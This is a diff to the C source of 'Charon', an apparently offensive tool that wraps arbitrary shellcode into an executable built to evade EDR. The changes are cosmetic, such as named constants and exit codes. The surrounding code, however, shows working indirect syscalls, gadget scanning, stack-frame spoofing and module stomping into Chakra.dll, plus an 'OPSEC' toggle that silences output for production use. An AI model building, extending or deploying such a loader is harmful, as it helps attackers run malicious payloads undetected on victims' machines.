@@ -6,7 +6,7 @@
  *  Purpose:
  *      Generates a standalone executable (CharonArtifact.exe) designed to
  *      execute shellcode while evading EDR (Endpoint Detection and Response)
- * hooks.
+ *      hooks.
  *
  *  Key Techniques:
  *      1. Indirect Syscalls: Bypasses user-mode hooks by executing the
@@ -231,6 +231,9 @@ const char *g_StubTemplate =
     "#include <stdio.h>\n"
     "#include <string.h>\n"
     "\n"
+    "#define INVALID_SSN ((DWORD64)-1)\n"
+    "#define DEFAULT_FRAME_SIZE 0x28\n"
+    "\n"
     // --- OPSEC TOGGLE ---
     // Uncomment the line below to silence all prints for Production
     "// #define printf(...) \n"
@@ -342,7 +345,7 @@ const char *g_StubTemplate =
     "idx * 32 + 3) == 0xb8)\n"
     "            return *((PBYTE)pAddress - idx * 32 + 4) + idx;\n"
     "    }\n"
-    "    return -1;\n"
+    "    return INVALID_SSN;\n"
     "}\n"
     "\n"
     // FindGadgetInModule: Scans a module for 'jmp REG' opcodes to use for stack
@@ -451,11 +454,11 @@ const char *g_StubTemplate =
     "    \n"
     // Dynamically resolve RtlLookupFunctionEntry to access Unwind Info
     "    PVOID pH = GetProcAddress(GetModuleHandleA(sK32), sRtl);\n"
-    "    if(!pH) return 0x28;\n"
+    "    if(!pH) return DEFAULT_FRAME_SIZE;\n"
     "    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)pH;\n"
     "    DWORD64 ImageBase;\n"
     "    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);\n"
-    "    if(!pRF) return 0x28;\n"
+    "    if(!pRF) return DEFAULT_FRAME_SIZE;\n"
     "    \n"
     "    PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);\n"
     "    DWORD size = 0;\n"
@@ -559,7 +562,7 @@ const char *g_StubTemplate =
     "'Nt' or 'Zw'\n"
     "        \n"
     "        DWORD64 dwSsn = GetSSN(pAddress);\n"
-    "        if (dwSsn == -1) continue;\n"
+    "        if (dwSsn == INVALID_SSN) continue;\n"
     "        \n"
     "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
     "        if (!pSyscallRet) continue;\n"
@@ -617,7 +620,7 @@ const char *g_StubTemplate =
     "HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
     "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
-    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return -1; }\n"
+    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return 1; }\n"
     "\n"
     // -------------------------------------------------------------------------
     // [STAGE 1] Module Stomping Setup
@@ -628,7 +631,7 @@ const char *g_StubTemplate =
     "    char sChakra[] = {'C','h','a','k','r','a','.','d','l','l',0};\n"
     "    HMODULE hChakra = ((fnLoadLibraryExA)g_pLoadLibraryExA)(sChakra, "
     "NULL, 0x1);\n"
-    "    if (!hChakra) { printf(\"[!] Chakra.dll not found\\n\"); return -1; "
+    "    if (!hChakra) { printf(\"[!] Chakra.dll not found\\n\"); return 1; "
     "}\n"
     "    \n"
     // Find .text section to inject into
@@ -644,12 +647,12 @@ const char *g_StubTemplate =
     "            // Safety check: Ensure payload fits in the section\n"
     "            if (sSize + 4096 > pSec[i].Misc.VirtualSize) { printf(\"[!] "
     "Payload "
-    "too big for .text\\n\"); return -1; }\n"
+    "too big for .text\\n\"); return 1; }\n"
     "            break;\n"
     "        }\n"
     "    }\n"
     "    if (!pAddr) { printf(\"[!] .text section not found in "
-    "Chakra.dll\\n\"); return -1; }\n"
+    "Chakra.dll\\n\"); return 1; }\n"
     "    printf(\"[+] Found target memory at %p (File-Backed)\\n\", pAddr);\n"
     "\n"
     // -------------------------------------------------------------------------
@@ -672,7 +675,7 @@ const char *g_StubTemplate =
     "&dwOld);\n"
     "    if(status != 0) { printf(\"[!] Protect (RW) Failed: 0x%X\\n\", "
     "status); "
-    "return -1; }\n"
+    "return 1; }\n"
     "\n"
     // -------------------------------------------------------------------------
     // [STAGE 3] Payload Decryption
@@ -700,7 +703,7 @@ const char *g_StubTemplate =
     "    status = fProt(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
     "    if(status != 0) { printf(\"[!] Protect (RX) Failed: 0x%X\\n\", "
     "status); "
-    "return -1; }\n"
+    "return 1; }\n"
     "\n"
     // -------------------------------------------------------------------------
     // [STAGE 5] Execution
@@ -829,7 +832,7 @@ int main(int argc, char *argv[]) {
 
   if (argc < 2) {
     printf("Usage: Charon.exe <shellcode_file>\n");
-    return 1;
+    return EXIT_FAILURE;
   }
 
   srand((unsigned int)time(NULL));
@@ -843,7 +846,7 @@ int main(int argc, char *argv[]) {
   unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
   if (!shellcode) {
     printf("[!] Failed to read file.\n");
-    return 1;
+    return EXIT_FAILURE;
   }
 
   // -----------------------------------------------------------------------
@@ -918,7 +921,7 @@ int main(int argc, char *argv[]) {
   printf("[*] Assembling (ML64)...\n");
   if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
     printf("[!] Assembly Failed.\n");
-    return 1;
+    return EXIT_FAILURE;
   }
 
   // -----------------------------------------------------------------------
@@ -958,9 +961,9 @@ int main(int argc, char *argv[]) {
 
   if (res == 0) {
     printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
-    return 0;
+    return EXIT_SUCCESS;
   } else {
     printf("\n[!] FAILURE: Compilation error.\n");
-    return 1;
+    return EXIT_FAILURE;
   }
 }
